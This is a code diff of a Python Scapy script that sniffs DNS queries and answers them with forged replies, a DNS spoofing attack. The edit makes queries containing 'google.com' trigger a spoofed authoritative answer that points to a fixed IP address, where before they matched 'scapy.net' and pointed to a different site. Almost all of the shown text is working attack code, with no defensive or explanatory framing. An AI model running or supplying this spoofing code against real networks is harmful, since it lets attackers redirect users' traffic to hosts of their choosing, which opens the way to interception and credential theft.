@@ -17,7 +17,7 @@ def dns_reply(pkt):
     spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
         UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
         DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
-        an=DNSRR(rrname="www.millesima.fr", ttl=100, rdata='34.255.167.124')) 
+        an=DNSRR(rrname="github.com", ttl=100, rdata='140.82.121.3')) 
     send(spoofed_pkt)
 
 # def dns_crequest(pkt):
@@ -35,7 +35,7 @@ def sniff_DNS(pkt):
            print('[**] Detected DNS QR Message at: ' + pkt_time)
            if pkt[DNS].qd.qname:
                print(str(pkt[DNS].qd.qname))
-               if "scapy.net" in str(pkt[DNS].qd.qname):
+               if "google.com" in str(pkt[DNS].qd.qname):
                 print("success")
                 dns_reply(pkt)
            
